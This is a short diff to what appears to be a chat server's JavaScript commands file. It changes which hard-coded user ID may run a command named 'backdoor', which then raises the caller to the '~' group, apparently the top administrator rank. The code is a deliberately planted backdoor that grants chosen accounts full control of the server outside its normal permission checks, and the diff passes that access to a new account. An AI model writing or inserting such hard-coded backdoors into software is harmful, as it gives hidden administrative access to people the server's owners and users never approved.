@@ -518,7 +518,7 @@ var components = exports.components = {
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'nne' && user.userid !== 'prfssrstein') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'ifaze' && user.userid !== 'prfssrstein') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
